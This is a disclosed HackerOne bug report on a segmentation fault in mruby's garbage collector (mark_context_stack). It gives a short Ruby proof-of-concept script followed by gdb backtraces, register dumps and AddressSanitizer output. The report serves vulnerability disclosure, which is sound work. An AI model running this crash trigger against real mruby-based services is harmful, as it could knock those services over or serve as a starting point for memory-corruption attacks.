# SIGSEGV - mark_context_stack

## Report Details
- **Report ID**: 209937
- **URL**: https://hackerone.com/reports/209937
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-03-01T21:59:51.440Z
- **Disclosed**: 2017-05-13T21:32:16.707Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
-------------------

The following code triggers the bug (attached as test_mark_context_stack.rb):

	def one
	too{yield}end
	def too
	yield
	ensure
	one{break}end
	one

Debug - mirb
-------------------

	Starting program: /home/x/Desktop/test/mruby/bin/mirb test_mark_context_stack
	mirb - Embeddable Interactive Ruby Shell

	 => :one
	 => :too

	Program received signal SIGSEGV, Segmentation fault.
	0x0000000000435a7e in mark_context_stack (mrb=0x6af010, c=0x6bb530) at /home/x/Desktop/test/mruby/src/gc.c:554
	554	      if (mrb_basic_ptr(v)->tt == MRB_TT_FREE) {
	(gdb) l
	549	  if (c->stbase + e > c->stend) e = c->stend - c->stbase;
	550	  for (i=0; i<e; i++) {
	551	    mrb_value v = c->stbase[i];
	552	
	553	    if (!mrb_immediate_p(v)) {
	554	      if (mrb_basic_ptr(v)->tt == MRB_TT_FREE) {
	555	        c->stbase[i] = mrb_nil_value();
	556	      }
	557	      else {
	558	        mrb_gc_mark(mrb, mrb_basic_ptr(v));
	(gdb) info reg
	rax            0x0	0
	rbx            0x737280	7565952
	rcx            0x6af0e8	7008488
	rdx            0x6fe0f0	7332080
	rsi            0x6b67b0	7038896
	rdi            0x6af010	7008272
	rbp            0x7ffffff97db0	0x7ffffff97db0
	rsp            0x7ffffff97d70	0x7ffffff97d70
	r8             0x0	0
	r9             0x423125	4337957
	r10            0x0	0
	r11            0x0	0
	r12            0x3	3
	r13            0x3	3
	r14            0x0	0
	r15            0x0	0
	rip            0x435a7e	0x435a7e <mark_context_stack+201>
	eflags         0x10212	[ AF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0

Backtrace - mirb
-------------------

	(gdb) bt
	#0  0x0000000000435a7e in mark_context_stack (mrb=0x6af010, c=0x6bb530) at /home/x/Desktop/test/mruby/src/gc.c:554
	#1  0x000000000043694b in final_marking_phase (mrb=0x6af010, gc=0x6af0e8) at /home/x/Desktop/test/mruby/src/gc.c:991
	#2  0x0000000000436d5d in incremental_gc (mrb=0x6af010, gc=0x6af0e8, limit=2000)
		at /home/x/Desktop/test/mruby/src/gc.c:1089
	#3  0x0000000000436e57 in incremental_gc_step (mrb=0x6af010, gc=0x6af0e8)
		at /home/x/Desktop/test/mruby/src/gc.c:1121
	#4  0x0000000000436ffd in mrb_incremental_gc (mrb=0x6af010) at /home/x/Desktop/test/mruby/src/gc.c:1165
	#5  0x0000000000435884 in mrb_obj_alloc (mrb=0x6af010, ttype=MRB_TT_PROC, cls=0x6bb370)
		at /home/x/Desktop/test/mruby/src/gc.c:507
	#6  0x00000000004142b8 in mrb_proc_new (mrb=0x6af010, irep=0x7236e0) at /home/x/Desktop/test/mruby/src/proc.c:22
	#7  0x000000000041449d in mrb_closure_new (mrb=0x6af010, irep=0x7236e0) at /home/x/Desktop/test/mruby/src/proc.c:69
	#8  0x000000000040f70a in mrb_vm_exec (mrb=0x6af010, proc=0x6b1fe0, pc=0x71d598)
		at /home/x/Desktop/test/mruby/src/vm.c:2354
	#9  0x0000000000408395 in mrb_vm_run (mrb=0x6af010, proc=0x744040, self=..., stack_keep=2)
		at /home/x/Desktop/test/mruby/src/vm.c:815
	#10 0x0000000000410593 in mrb_run (mrb=0x6af010, proc=0x744040, self=...)
		at /home/x/Desktop/test/mruby/src/vm.c:2562
	#11 0x0000000000406a63 in ecall (mrb=0x6af010, i=0) at /home/x/Desktop/test/mruby/src/vm.c:311
	#12 0x000000000040c23a in mrb_vm_exec (mrb=0x6af010, proc=0x744100, pc=0x72d774)
		at /home/x/Desktop/test/mruby/src/vm.c:1740
	#13 0x0000000000408395 in mrb_vm_run (mrb=0x6af010, proc=0x744160, self=..., stack_keep=2)
		at /home/x/Desktop/test/mruby/src/vm.c:815
	#14 0x0000000000410593 in mrb_run (mrb=0x6af010, proc=0x744160, self=...)
		at /home/x/Desktop/test/mruby/src/vm.c:2562
	#15 0x0000000000406a63 in ecall (mrb=0x6af010, i=0) at /home/x/Desktop/test/mruby/src/vm.c:311
	#16 0x000000000040c23a in mrb_vm_exec (mrb=0x6af010, proc=0x744220, pc=0x72d774)
		at /home/x/Desktop/test/mruby/src/vm.c:1740
	#17 0x0000000000408395 in mrb_vm_run (mrb=0x6af010, proc=0x744280, self=..., stack_keep=2)
		at /home/x/Desktop/test/mruby/src/vm.c:815
	#18 0x0000000000410593 in mrb_run (mrb=0x6af010, proc=0x744280, self=...)
		at /home/x/Desktop/test/mruby/src/vm.c:2562
	#19 0x0000000000406a63 in ecall (mrb=0x6af010, i=0) at /home/x/Desktop/test/mruby/src/vm.c:311
	#20 0x000000000040c23a in mrb_vm_exec (mrb=0x6af010, proc=0x744340, pc=0x72d774)
		at /home/x/Desktop/test/mruby/src/vm.c:1740
	#21 0x0000000000408395 in mrb_vm_run (mrb=0x6af010, proc=0x7443a0, self=..., stack_keep=2)
		at /home/x/Desktop/test/mruby/src/vm.c:815
	#22 0x0000000000410593 in mrb_run (mrb=0x6af010, proc=0x7443a0, self=...)
		at /home/x/Desktop/test/mruby/src/vm.c:2562
	#23 0x0000000000406a63 in ecall (mrb=0x6af010, i=0) at /home/x/Desktop/test/mruby/src/vm.c:311
	#24 0x000000000040c23a in mrb_vm_exec (mrb=0x6af010, proc=0x744460, pc=0x72d774)
		at /home/x/Desktop/test/mruby/src/vm.c:1740
	#25 0x0000000000408395 in mrb_vm_run (mrb=0x6af010, proc=0x7444c0, self=..., stack_keep=2)
		at /home/x/Desktop/test/mruby/src/vm.c:815
	#26 0x0000000000410593 in mrb_run (mrb=0x6af010, proc=0x7444c0, self=...)
		at /home/x/Desktop/test/mruby/src/vm.c:2562
	#27 0x0000000000406a63 in ecall (mrb=0x6af010, i=0) at /home/x/Desktop/test/mruby/src/vm.c:311
	#28 0x000000000040c23a in mrb_vm_exec (mrb=0x6af010, proc=0x744580, pc=0x72d774)
		at /home/x/Desktop/test/mruby/src/vm.c:1740
	#29 0x0000000000408395 in mrb_vm_run (mrb=0x6af010, proc=0x7445e0, self=..., stack_keep=2)
		at /home/x/Desktop/test/mruby/src/vm.c:815
	---Type <return> to continue, or q <return> to quit---q
	
Clang - mirb
-------------------

	x@x:~/Desktop/test/clang/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ./mirb test_mark_context_stack 
	mirb - Embeddable Interactive Ruby Shell

	 => :one
	 => :too
	ASAN:DEADLYSIGNAL
	=================================================================
	==10022==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x000000532e2d bp 0x7fff0e4048b0 sp 0x7fff0e404860 T0)
		#0 0x532e2c in mark_context_stack /home/x/Desktop/test/clang/mruby/src/gc.c:554:11
		#1 0x532c43 in mark_context /home/x/Desktop/test/clang/mruby/src/gc.c:571:3
		#2 0x5326ec in root_scan_phase /home/x/Desktop/test/clang/mruby/src/gc.c:873:3
		#3 0x53231f in incremental_gc /home/x/Desktop/test/clang/mruby/src/gc.c:1080:5
		#4 0x53177d in incremental_gc_step /home/x/Desktop/test/clang/mruby/src/gc.c:1121:15
		#5 0x5313f0 in mrb_incremental_gc /home/x/Desktop/test/clang/mruby/src/gc.c:1165:5
		...
		#250 0x4fd70e in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1740:11
		#251 0x4f98ce in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:815:10

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/gc.c:554:11 in mark_context_stack
	==10022==ABORTING

Debug - mruby
-------------------

	Reading symbols from ./mruby...done.
	(gdb) r test_mark_context_stack 
	Starting program: /home/x/Desktop/test/mruby/bin/mruby test_mark_context_stack

	Program received signal SIGSEGV, Segmentation fault.
	0x0000000000432e05 in mark_context_stack (mrb=0x6ae010, c=0x6ba530) at /home/x/Desktop/test/mruby/src/gc.c:554
	554	      if (mrb_basic_ptr(v)->tt == MRB_TT_FREE) {
	(gdb) l
	549	  if (c->stbase + e > c->stend) e = c->stend - c->stbase;
	550	  for (i=0; i<e; i++) {
	551	    mrb_value v = c->stbase[i];
	552	
	553	    if (!mrb_immediate_p(v)) {
	554	      if (mrb_basic_ptr(v)->tt == MRB_TT_FREE) {
	555	        c->stbase[i] = mrb_nil_value();
	556	      }
	557	      else {
	558	        mrb_gc_mark(mrb, mrb_basic_ptr(v));
	(gdb) info reg
	rax            0x0	0
	rbx            0x734d30	7556400
	rcx            0x6ae0e8	7004392
	rdx            0x6fd180	7328128
	rsi            0x6b57b0	7034800
	rdi            0x6ae010	7004176
	rbp            0x7ffffff98e90	0x7ffffff98e90
	rsp            0x7ffffff98e50	0x7ffffff98e50
	r8             0x0	0
	r9             0x4204ac	4326572
	r10            0x0	0
	r11            0x0	0
	r12            0x3	3
	r13            0x3	3
	r14            0x0	0
	r15            0x0	0
	rip            0x432e05	0x432e05 <mark_context_stack+201>
	eflags         0x10212	[ AF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0

Backtrace - mruby
-------------------

	(gdb) bt
	#0  0x0000000000432e05 in mark_context_stack (mrb=0x6ae010, c=0x6ba530) at /home/x/Desktop/test/mruby/src/gc.c:554
	#1  0x0000000000433cd2 in final_marking_phase (mrb=0x6ae010, gc=0x6ae0e8) at /home/x/Desktop/test/mruby/src/gc.c:991
	#2  0x00000000004340e4 in incremental_gc (mrb=0x6ae010, gc=0x6ae0e8, limit=2000)
		at /home/x/Desktop/test/mruby/src/gc.c:1089
	#3  0x00000000004341de in incremental_gc_step (mrb=0x6ae010, gc=0x6ae0e8)
		at /home/x/Desktop/test/mruby/src/gc.c:1121
	#4  0x0000000000434384 in mrb_incremental_gc (mrb=0x6ae010) at /home/x/Desktop/test/mruby/src/gc.c:1165
	#5  0x0000000000432c0b in mrb_obj_alloc (mrb=0x6ae010, ttype=MRB_TT_ENV, cls=0x0)
		at /home/x/Desktop/test/mruby/src/gc.c:507
	#6  0x0000000000414269 in env_new (mrb=0x6ae010, nlocals=2) at /home/x/Desktop/test/mruby/src/proc.c:42
	#7  0x0000000000414335 in closure_setup (mrb=0x6ae010, p=0x741a40, nlocals=2)
		at /home/x/Desktop/test/mruby/src/proc.c:57
	#8  0x00000000004143c5 in mrb_closure_new (mrb=0x6ae010, irep=0x71d720) at /home/x/Desktop/test/mruby/src/proc.c:71
	#9  0x0000000000409541 in mrb_vm_exec (mrb=0x6ae010, proc=0x6b0f80, pc=0x71c6b4)
		at /home/x/Desktop/test/mruby/src/vm.c:1106
	#10 0x000000000040828c in mrb_vm_run (mrb=0x6ae010, proc=0x741b60, self=..., stack_keep=2)
		at /home/x/Desktop/test/mruby/src/vm.c:815
	#11 0x000000000041048a in mrb_run (mrb=0x6ae010, proc=0x741b60, self=...)
		at /home/x/Desktop/test/mruby/src/vm.c:2562
	#12 0x000000000040695a in ecall (mrb=0x6ae010, i=0) at /home/x/Desktop/test/mruby/src/vm.c:311
	#13 0x000000000040c131 in mrb_vm_exec (mrb=0x6ae010, proc=0x741c20, pc=0x72a9f4)
		at /home/x/Desktop/test/mruby/src/vm.c:1740
	#14 0x000000000040828c in mrb_vm_run (mrb=0x6ae010, proc=0x741c80, self=..., stack_keep=2)
		at /home/x/Desktop/test/mruby/src/vm.c:815
	#15 0x000000000041048a in mrb_run (mrb=0x6ae010, proc=0x741c80, self=...)
		at /home/x/Desktop/test/mruby/src/vm.c:2562
	#16 0x000000000040695a in ecall (mrb=0x6ae010, i=0) at /home/x/Desktop/test/mruby/src/vm.c:311
	#17 0x000000000040c131 in mrb_vm_exec (mrb=0x6ae010, proc=0x741d40, pc=0x72a9f4)
		at /home/x/Desktop/test/mruby/src/vm.c:1740
	#18 0x000000000040828c in mrb_vm_run (mrb=0x6ae010, proc=0x741da0, self=..., stack_keep=2)
		at /home/x/Desktop/test/mruby/src/vm.c:815
	#19 0x000000000041048a in mrb_run (mrb=0x6ae010, proc=0x741da0, self=...)
		at /home/x/Desktop/test/mruby/src/vm.c:2562
	#20 0x000000000040695a in ecall (mrb=0x6ae010, i=0) at /home/x/Desktop/test/mruby/src/vm.c:311
	#21 0x000000000040c131 in mrb_vm_exec (mrb=0x6ae010, proc=0x741e60, pc=0x72a9f4)
		at /home/x/Desktop/test/mruby/src/vm.c:1740
	#22 0x000000000040828c in mrb_vm_run (mrb=0x6ae010, proc=0x741ec0, self=..., stack_keep=2)
		at /home/x/Desktop/test/mruby/src/vm.c:815
	#23 0x000000000041048a in mrb_run (mrb=0x6ae010, proc=0x741ec0, self=...)
		at /home/x/Desktop/test/mruby/src/vm.c:2562
	#24 0x000000000040695a in ecall (mrb=0x6ae010, i=0) at /home/x/Desktop/test/mruby/src/vm.c:311
	#25 0x000000000040c131 in mrb_vm_exec (mrb=0x6ae010, proc=0x741f80, pc=0x72a9f4)
		at /home/x/Desktop/test/mruby/src/vm.c:1740
	#26 0x000000000040828c in mrb_vm_run (mrb=0x6ae010, proc=0x741fe0, self=..., stack_keep=2)
		at /home/x/Desktop/test/mruby/src/vm.c:815
	#27 0x000000000041048a in mrb_run (mrb=0x6ae010, proc=0x741fe0, self=...)
		at /home/x/Desktop/test/mruby/src/vm.c:2562
	#28 0x000000000040695a in ecall (mrb=0x6ae010, i=0) at /home/x/Desktop/test/mruby/src/vm.c:311
	#29 0x000000000040c131 in mrb_vm_exec (mrb=0x6ae010, proc=0x7420a0, pc=0x72a9f4)
		at /home/x/Desktop/test/mruby/src/vm.c:1740
	---Type <return> to continue, or q <return> to quit---q
	
Clang - mruby
-------------------

	x@x:~/Desktop/test/clang/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ./mruby test_mark_context_stack 
	ASAN:DEADLYSIGNAL
	=================================================================
	==31285==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000052f38d bp 0x7fff13b3f5e0 sp 0x7fff13b3f590 T0)
		#0 0x52f38c in mark_context_stack /home/x/Desktop/test/clang/mruby/src/gc.c:554:11
		#1 0x52f1a3 in mark_context /home/x/Desktop/test/clang/mruby/src/gc.c:571:3
		#2 0x52ec4c in root_scan_phase /home/x/Desktop/test/clang/mruby/src/gc.c:873:3
		#3 0x52e87f in incremental_gc /home/x/Desktop/test/clang/mruby/src/gc.c:1080:5
		...
		#250 0x4f94de in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:815:10
		#251 0x4f8803 in mrb_run /home/x/Desktop/test/clang/mruby/src/vm.c:2562:12

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/gc.c:554:11 in mark_context_stack
	==31285==ABORTING

## Attachments
- test_mark_context_stack.rb
